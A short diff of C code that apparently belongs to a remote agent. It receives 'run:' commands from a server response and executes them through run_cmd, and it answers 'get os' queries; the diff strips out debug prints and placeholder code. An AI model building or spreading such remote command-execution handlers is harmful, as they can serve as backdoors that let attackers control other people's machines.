@@ -39,7 +39,6 @@ int main(int argc, char **argv){
             free(data);
         data = NULL;
         if (!strncmp(resp, "run:", 4)) {
-            puts("Run command here");
             uint32_t resplen = strlen(resp);
             uint32_t cmdlen = resplen-4;
             if (cmdlen) {
@@ -73,9 +72,7 @@ int main(int argc, char **argv){
                    data = run_cmd(cmd,NULL);
                 }
                 free(cmd);
-                //data = (char*)malloc(strlen("Triggered")+1);
             }
-            //strcpy(data, "Triggered");
         }
         if (!strncmp(resp, "get os", 7)){
             data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
